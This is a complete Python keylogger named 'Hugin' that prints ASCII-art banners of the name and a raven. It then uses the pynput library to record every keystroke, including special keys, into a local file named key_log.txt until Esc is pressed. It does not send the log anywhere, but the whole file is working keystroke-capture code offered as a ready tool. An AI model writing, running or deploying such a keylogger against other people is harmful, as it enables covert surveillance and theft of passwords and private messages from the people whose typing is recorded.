from pynput import keyboard
from art import text2art
from colorama import Fore, Style, init
init()

log_file = "key_log.txt"

def ascii_art():
    title = f"""
    {Fore.RED}
██╗  ██╗██╗   ██╗ ██████╗ ██╗███╗   ██╗
██║  ██║██║   ██║██╔════╝ ██║████╗  ██║
███████║██║   ██║██║  ███╗██║██╔██╗ ██║
██╔══██║██║   ██║██║   ██║██║██║╚██╗██║
██║  ██║╚██████╔╝╚██████╔╝██║██║ ╚████║
╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝


{Style.RESET_ALL}
"""
    raven = f"""
    {Fore.MAGENTA}
    ⠀⠀⠀⠀             ⢀⣠⢠⣴⣶⣤⣶⣦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣯⣿⣿⣿⣿⣿⣿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡭⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⢟⣵⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⢿⣿⣿⠟⣡⣾⣿⣿⣿⣿⣿⠶⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⢫⣾⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡀⣿⣿⣿⡟⣱⣿⣿⣿⣿⣯⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣸⣷⣿⣿⢏⣼⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⢃⣾⣿⣿⣿⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⡿⢡⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⡿⢡⣿⡿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣸⠃⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀
{Style.RESET_ALL}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    combined_art = title + raven
    print(combined_art)

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False


if __name__ == "__main__":
    ascii_art()
    print(f"{Fore.RED}Hugin is observing you...{Style.RESET_ALL}")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
